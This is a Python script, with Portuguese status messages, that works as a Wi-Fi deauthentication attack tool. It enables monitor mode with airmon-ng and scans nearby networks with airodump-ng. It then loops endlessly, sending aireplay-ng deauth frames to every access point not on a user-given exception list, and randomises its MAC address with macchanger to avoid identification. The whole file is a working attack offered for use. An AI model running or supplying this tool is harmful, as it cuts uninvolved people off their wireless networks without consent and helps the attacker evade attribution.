import sys
import os
from datetime import datetime

class Deauther:
	def __init__(self):
		self.interface = ""
		self.exceptions = ""

	def how_to_use(self):
		if len(sys.argv) > 1:
			self.interface = sys.argv[-1]
			if len(sys.argv) > 2:
				self.exceptions = sys.argv[1].replace(" ", "").split(",")
				print(f"[*] Exceptions: {str(self.exceptions).replace('[', '').replace(']', '')}")
		else:
			print("How to use: python3 deauther.py interface mac,mac")
			exit()

	def configure(self):
		output = os.popen(f'iwconfig {self.interface}mon 1>/dev/null 2>/dev/null&&echo $?').read()
		if output != "0":
			out = os.popen(f"airmon-ng check kill 1>/dev/null 2>/dev/null&&airmon-ng start {self.interface}").read()
			if out == "0":
				print("[+] Processos finalizados")
				print("[+] Modo monitoramento ativado")
		else:
			print("[+] Modo monitoramento ON")

		if not os.path.exists("wifis-01.csv"):
			print("[*] Escaneando...")
			os.system(f"timeout --preserve-status --foreground 30 airodump-ng --output-format csv -w wifis {self.interface}mon 1>/dev/null 2>/dev/null")
			print("[+] Arquivo 'wifis-01.csv' salvo!")
		else:
			print("[*] Arquivo wifis-01.csv")


	def scraping(self):
		all_signals = []
		signals = {}
		with open("wifis-01.csv") as wifis:
			for line in wifis.readlines()[2:]:
				all_signals.append(line.split("\n"))
			for signal in all_signals:
				itens = signal[0].split(", ")
				try:
					if itens[0] != "Station MAC": 
						signals[itens[13]] = [itens[0], itens[3]]
					else:
						break
				except:
					pass

		return signals


	def deauth(self):
		print("[+] Iniciando...")
		while True:
			counter = 0
			for key,value in self.scraping().items():
				if not value[0] in self.exceptions:
					time = datetime.now().strftime("%H:%M:%S")
					status = ""
					if counter == 0:
						status = os.popen(f"ifconfig {self.interface}mon down&&macchanger -r {self.interface}mon&&ifconfig {self.interface}mon up&&iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 10 -a {value[0]} {self.interface}mon").read()
						new_mac = os.popen(f"macchanger -s {self.interface}mon").read().split(" ")[4]
						print(f"\n[+] New Mac: {str(new_mac)}")
						counter+=1
					else:
						status = os.popen(f"iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 10 -a {value[0]} {self.interface}mon").read()
					if "code 7" in status:
						if key != "":
							print(f"\nDeauth: {key}")
							print(f"        * HORA: {time}")
							print(f"	* BSSID: {value[0]}")
							print(f"        * CHANNEL: {value[1]}")
						else:
							print(f"\nDeauth: Unknown")
							print(f"        * HORA: {time}")
							print(f"        * BSSID: {value[0]}")
							print(f"        * CHANNEL: {value[1]}")

	def start(self):
		self.how_to_use()
		self.configure()
		self.deauth()


if __name__ == "__main__":
	deauther = Deauther()
	deauther.start()
